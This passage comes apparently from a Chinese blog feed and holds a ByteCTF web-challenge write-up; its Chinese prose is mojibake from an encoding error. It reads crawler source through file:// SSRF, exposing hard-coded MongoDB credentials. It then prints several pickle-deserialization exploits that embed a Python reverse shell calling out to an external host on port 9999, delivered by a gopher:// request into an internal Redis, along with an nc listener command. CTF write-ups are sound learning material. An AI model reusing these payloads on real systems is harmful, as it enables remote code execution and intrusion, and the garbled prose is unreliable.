class="hljs-keyword">def</span> <span class="hljs-title">parse2</span>(<span class="hljs-params">self, response</span>):</span><br>        item = response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>        item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> item<br><br></code></pre></td></tr></table></figure><p>å°è¯•è¯»å–å‰é¢çŒœæµ‹çš„æ–‡ä»¶ï¼Œitems.pyã€pipelines.pyã€bytectf/<strong>init</strong>.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/items.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/pipelines.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>å›æ˜¾ç»“æœï¼š</p><ol><li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># items.py</span><br><br><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfItem</span>(<span class="hljs-params">scrapy.Item</span>):</span><br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br>    byte_start = scrapy.Field()  <span class="hljs-comment"># èµ·å§‹é¡µé¢</span><br>    byte_url = scrapy.Field()  <span class="hljs-comment"># å½“å‰é¡µé¢</span><br>    byte_text = scrapy.Field()  <span class="hljs-comment"># text</span><br><br></code></pre></td></tr></table></figure></li><li>pipelines.pyï¼ˆç­‰ç­‰ï¼ŒN0rth3 æ€ä¹ˆé‚£ä¹ˆç†Ÿæ‚‰ï¼Œå‡ºé¢˜äººå¯è¿˜è¡Œï¼Œæ²¡æ³¨æ„ï¼‰<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfPipeline</span>:</span><br>    <span class="hljs-comment"># è¿æ¥æ•°æ®åº“</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># è·å–æ•°æ®åº“è¿æ¥ä¿¡æ¯</span><br>        MONGODB_HOST = <span class="hljs-string">&#x27;172.20.0.8&#x27;</span><br>        MONGODB_PORT = <span class="hljs-number">27017</span><br>        MONGODB_DBNAME = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_TABLE = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_USER = <span class="hljs-string">&#x27;N0rth3&#x27;</span><br>        MONGODB_PASSWD = <span class="hljs-string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span><br>        mongo_client = pymongo.MongoClient(<br>            <span class="hljs-string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))<br>        mongo_client[MONGODB_DBNAME].authenticate(<br>            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)<br>        mongo_db = mongo_client[MONGODB_DBNAME]<br>        self.table = mongo_db[MONGODB_TABLE]<br><span class="hljs-comment"># å¤„ç†item</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span><br><span class="hljs-comment"># ä½¿ç”¨dictè½¬æ¢itemï¼Œç„¶åæ’å…¥æ•°æ®åº“</span><br>    quote_info = dict(item)<br>    print(quote_info)<br>    self.table.insert(quote_info)<br>    <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure></li><li>bytectf/<strong>init</strong>.pyï¼šç©º</li></ol><p>çˆ¬è™«æºç éå¸¸ç®€å•ï¼Œå…¨éƒ¨æ–‡ä»¶è¯»å‡ºæ¥è¿˜ä¼šå‘ç°å†…ç½‘æœ‰ä¸€å° mongodb å…¶å®ä¸ºäº†é˜²æ­¢å¤§å®¶è·‘åè¿™å° mongodb ç‰¹æ„åŠ äº†å¯†ç ï¼Œç®€å•æƒ³ä¸€ä¸‹å°±ä¼šå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆèƒ½åˆ©ç”¨çš„ï¼ˆåŸå› ï¼šredis æœºå™¨çš„ ip ä¸æ˜¯ localhostï¼Œæ‰€ä»¥æ‹¿åˆ° shell ä¹Ÿæ²¡ç”¨ï¼‰ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­åˆ†æçˆ¬è™«çš„æºç ï¼ˆä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼‰ã€‚ä¹Ÿå°±æ˜¯å…¶ä¸­çš„è¿™æ®µä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py ç‰‡æ®µ</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># ä¸»é”®ï¼ŒåŸå§‹ url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ç”¨ scrapy_redis å†™çš„ä¸€ä¸ªçˆ¬è™«ï¼ŒåŠŸèƒ½å³æ¥æ”¶urlï¼ŒæŠ“å–å…¶ä¸­çš„ url é“¾æ¥ç„¶åçˆ¬å–ã€‚</p><h2 id="Pythonååºåˆ—åŒ–"><a href="#Pythonååºåˆ—åŒ–" class="headerlink" title="Pythonååºåˆ—åŒ–"></a>Pythonååºåˆ—åŒ–</h2><p>æ–‡ä»¶åŸºæœ¬è¯»å–å®Œæˆï¼Œæ•´ç†ä¸€ä¸‹å·²çŸ¥ä¿¡æ¯ï¼šï¼ˆåˆ†ææ•°æ®æµï¼Œç„¶ååˆ†ææ•°æ®æµä¸­é—´å±é™©å‡½æ•°ï¼‰</p><ol><li>web åº”ç”¨å°†ä»»åŠ¡ä¼ ç»™redisï¼Œredisåšä¸º brokerï¼ˆdumpsï¼‰</li><li>çˆ¬è™«ä»è¿™ä¸ª broker å¤„è·å–ä»»åŠ¡ï¼Œæœ€åå°†ä»»åŠ¡çš„ç»“æœå­˜å…¥ mongodbï¼Œæœ€åŸºç¡€çš„ä¸€å¥—åˆ†å¸ƒå¼åº”ç”¨æ¶æ„ï¼ˆloadsï¼‰ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle å‡½æ•°ï¼ï¼ï¼Python ååºåˆ—åŒ–æ¼æ´ï¼Œç›®å‰å¯ä»¥ç¡®å®šæ¼æ´ç±»å‹ä¸º Python ååºåˆ—åŒ–ã€‚</li></ol><p>é¢˜è§£çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp1.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>å°†å…¶ä¸­çš„ vps åœ°å€å’Œç«¯å£æ”¹ä¸ºè‡ªå·±çš„ï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨è¿è¡Œ nc -lvvp 9999ï¼Œå°†ç”Ÿæˆçš„ payload åœ¨ <a href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> çš„ url= ä¹‹åï¼Œå³å¯ get shellã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>æœ€åå¾—åˆ° flag ä¸º ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p><h2 id="æ‹†è§£exp"><a href="#æ‹†è§£exp" class="headerlink" title="æ‹†è§£exp"></a>æ‹†è§£exp</h2><p>exp ä¸­çŸ¥è¯†ç›²åŒºå¤ªå¤šã€‚å¯ä»¥è€ƒè™‘æ•´ç†è¿‡ååŸºç¡€è¡¥å……å§ï¼ˆNnn å¤§ä½¬è¿˜æä¾›ä¸€ç§æ€è·¯â€”â€”æ‰“ redisï¼‰ï¼Œæ•´ç†åçš„ exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp2.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            python -c  &#x27;import socket,subprocess,os;</span><br><span class="hljs-string">                        </span><br><span class="hljs-string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span><br><span class="hljs-string">                        os.dup2(s.fileno(),0);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),1);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),2);</span><br><span class="hljs-string">                        p=subprocess.call(</span><br><span class="hljs-string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span><br><span class="hljs-string">                                          );</span><br><span class="hljs-string">                        &#x27;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±ä¸€ç‚¹ç‚¹åˆ†æè¿™ä¸ª expï¼Œç„¶åè‡ªå·±å°è¯•äº› expã€‚</p><h3 id="pythonåå¼¹shell"><a href="#pythonåå¼¹shell" class="headerlink" title="pythonåå¼¹shell"></a>pythonåå¼¹shell</h3><p>æˆ‘å°†é‚£æ®µ <code>__reduce__</code>ä¸­çš„ä»£ç åœ¨æœ¬åœ°è¿›è¡Œæ‰§è¡Œï¼Œæµ‹è¯• bash å‘½ä»¤çš„æ­£ç¡®æ€§ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œç»è¿‡æ•´ç†åçš„ bash å‘½ä»¤ä¸èƒ½æ‰§è¡Œï¼Œä¹Ÿå°±å°è¯äº† exp2 ç”Ÿæˆçš„ payload æ— æ³•åå¼¹ shellã€‚</p><p>åœ¨è¿™é‡Œè¡¥äº†ä¸€ä¸‹ Python åå¼¹ shell çš„å§¿åŠ¿ã€‚å°è¯•ä½¿ç”¨è‡ªå·±çš„åå¼¹ shell è„šæœ¬ åå¼¹ shellã€‚Python åå¼¹ shell çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;120.55.50.65&quot;</span>, <span class="hljs-number">9999</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p = subprocess.call(<br>    [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]<br>)<br><br></code></pre></td></tr></table></figure><p>åœ¨ <a href="http://www.onelinerizer.com/">one-lined python å®˜ç½‘</a>ç”Ÿæˆä¸€è¡Œçš„ pythonï¼Œå¹¶åˆæˆæˆå‘½ä»¤</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>python -c &quot;(lambda <span class="hljs-strong">__g: [<span class="hljs-string">[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;</span>] in [<span class="hljs-string">(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;</span>]))]][<span class="hljs-string">0</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>] for __</span>g[<span class="hljs-string">&#x27;s&#x27;</span>] in [<span class="hljs-string">(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;os&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;os&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for __</span>g[<span class="hljs-string">&#x27;subprocess&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;subprocess&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;socket&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;socket&#x27;, __g, __g))</span>]][0])(globals())&quot;</span><br><span class="hljs-strong"></span><br></code></pre></td></tr></table></figure><p>å°†æ›¿æ¢åŸ exp ä¸­çš„ åå¼¹ shell è„šæœ¬ï¼Œå¾—åˆ°è„šæœ¬ï¼šï¼ˆæ³¨æ„å¼•å·é—®é¢˜ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><h3 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h3><p>æœ€åéœ€è¦çœ‹æ‡‚ poc çš„ å‰åŠéƒ¨åˆ†ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸€å°å—ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.20.0.7:6379/_ZADD byte:requests 0 &quot;â€œ</span><br><br></code></pre></td></tr></table></figure><p>åœ¨æ­¤ä¹‹å‰å…ˆå»è¡¥å……äº†ä¸€ä¸‹ gopher å’Œ redis çš„åŸºæœ¬ç”¨æ³•ã€‚å¹¶ä¸”é¢˜è§£ä¸­æåˆ°é€šè¿‡è§‚å¯Ÿæºç å¯ä»¥çŸ¥é“ scrapy_redis å®ƒä¼šå°†requestå¯¹è±¡å­˜å…¥çˆ¬è™«å:requestsè¿™æ ·çš„æœ‰åºåˆ—è¡¨ä¸­ã€‚è¿™é‡Œæˆ‘æœ‰ 2 ä¸ªé—®é¢˜ï¼š</p><ol><li>ä½¿ç”¨ gopher åè®®å¯ä»¥å‘ redis æ’å…¥æ•°æ®ï¼Ÿå¯ä»¥åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ã€‚</li><li>ä¸ºä»€ä¹ˆåœ¨ result= ä¹‹åå¯ä»¥ SSRFï¼Ÿæ€ä¹ˆè¿›è¡Œæµ‹è¯•ï¼Ÿ<br>ä½¿ç”¨ä¸‹é¢çš„ url åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œç¡®å®å¯ä»¥è·å–åˆ°æ•°æ®ã€‚<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># æ’å…¥é”®å’Œå€¼</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_set%<span class="hljs-number">20</span>runoobkey%<span class="hljs-number">20</span>redis<br><span class="hljs-comment"># è·å–å€¼</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_get%<span class="hljs-number">20</span>runoobkey<br><br></code></pre></td></tr></table></figure></li></ol><p>é€šè¿‡å‰é¢è¯»å–æºç ï¼Œå¯ä»¥çŸ¥é“ host</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>     localhost<br>::<span class="hljs-number">1</span>           localhost ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span>       ip6-localnet<br>ff00::<span class="hljs-number">0</span>       ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span>       ip6-allnodes<br>ff02::<span class="hljs-number">2</span>       ip6-allrouters<br><span class="hljs-number">172.20</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>    <span class="hljs-number">914</span>c062c7588<br><br></code></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹æ‰€æœ‰ ip çš„æ€è·¯ï¼ˆåªçœ‹åç¼€ï¼‰</p><ol><li>setting.py ä¸­æœ‰ä¸€ä¸ª .7 çš„ ip</li><li>pipelines.py ä¸­æœ‰ä¸€ä¸ª .8 çš„ ip</li><li>host ä¸­æœ‰ .5 çš„ ip<br>æ¯ä¸ª ip éƒ½å¯¹åº”ä¸€ä¸ª redisï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> å¯çŸ¥ï¼Œå­˜åœ¨ä¸»ä» redisã€‚å¦‚ä½•åˆ¤æ–­ ä¸»æœåŠ¡å™¨çš„åœ°å€å‘¢ï¼Ÿä¸ºå•¥å¼€å§‹ exp æ‰“ .7 çš„ ip å‘¢ï¼Ÿ</li></ol><p>è¿™ä¸ªé¢˜ç›®å·²ç»è¡¥å®Œäº†ï¼æœ€é‡è¦çš„æ€æƒ³å·²ç» GETï¼Œæ¯æ¬¡è¡¥é¢˜éƒ½ä¼šè¡¥é¢˜æ—¶é—´è¿‡é•¿ã€‚ã€‚å¯¼è‡´å¾ˆå¤šé¢˜ç›®æ²¡è¡¥å®Œï¼Œè¿™æ¬¡ä¹Ÿæ˜¯ã€‚(è¿˜æœ‰å¯èƒ½æ˜¯æ¯”è¾ƒèœçš„åŸå› -ã€‚-#)</p><hr><p>å®˜æ–¹å·²ç»å°†ç¯å¢ƒå…³é—­äº†ï¼Œé¢ï¼Œè¡¥ä¸å®Œäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020å¹´10æœˆN1CTFéƒ¨åˆ†webé¢˜è§£</title>
    <link href="/2020/10/17/2020%E5%B9%B410%E6%9C%8817%E6%97%A5-N1CTF/"/>
    <url>/2020/10/17/2020%E5%B9%B410%E6%9C%8817%E6%97%A5-N1CTF/</url>
    
